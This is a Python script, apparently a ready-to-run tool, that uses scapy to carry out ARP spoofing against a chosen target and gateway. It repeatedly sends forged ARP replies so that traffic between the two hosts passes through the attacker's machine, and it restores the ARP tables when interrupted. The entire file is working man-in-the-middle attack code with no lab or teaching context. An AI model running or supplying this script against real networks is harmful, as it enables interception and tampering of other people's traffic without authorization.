import scapy.all as scapy
import time
import sys
import argparse

def getArgs():
    parser = argparse.ArgumentParser()
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP")
    parser.add_argument("-t", "--target", dest="target", help="Target IP")
    options = parser.parse_args()
    if not options.gateway:
        parser.error("[-] Please specify IP of gateway, use --help or -h for more information")
    elif not options.target:
        parser.error("[-] Please specify IP of target, use --help or -h for more information")
    return options

def getMAC(ip):
    arp_request = scapy.ARP(pdst=ip)
    brdcst = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_brdcst = brdcst/arp_request
    answeredList = scapy.srp(arp_brdcst, timeout=1, verbose=0)[0]

    return answeredList[0][1].hwsrc

def spoof(targetIP, spoofIP):
    targetMAC = getMAC(targetIP)
    # print("\n" + targetIP + " --> " + targetMAC + "\n")
    ether = scapy.Ether(dst=targetMAC)
    ARPpacket = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofIP)
    packet = ether / ARPpacket
    scapy.sendp(packet, verbose=0)

def restore(destIP, srcIP):
    destMAC = getMAC(destIP)
    srcMAC = getMAC(srcIP)
    ether = scapy.Ether(dst=destMAC)
    restorePacket = scapy.ARP(op=2, pdst=destIP, hwdst=destMAC, psrc=srcIP, hwsrc=srcMAC)
    packet = ether / restorePacket
    scapy.sendp(packet, verbose=0, count=4)

options = getArgs()
targetIP = options.target
gatewayIP = options.gateway

try:
    packetsCount = 0
    while True:
        spoof(targetIP, gatewayIP)
        spoof(gatewayIP, targetIP)
        packetsCount += 2
        print("\r[+] Sent " + str(packetsCount) + " packets", end="")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n>>Ctrl+C detected; Restoring ARP tables and exiting program...")
    restore(targetIP, gatewayIP)
    restore(gatewayIP, targetIP)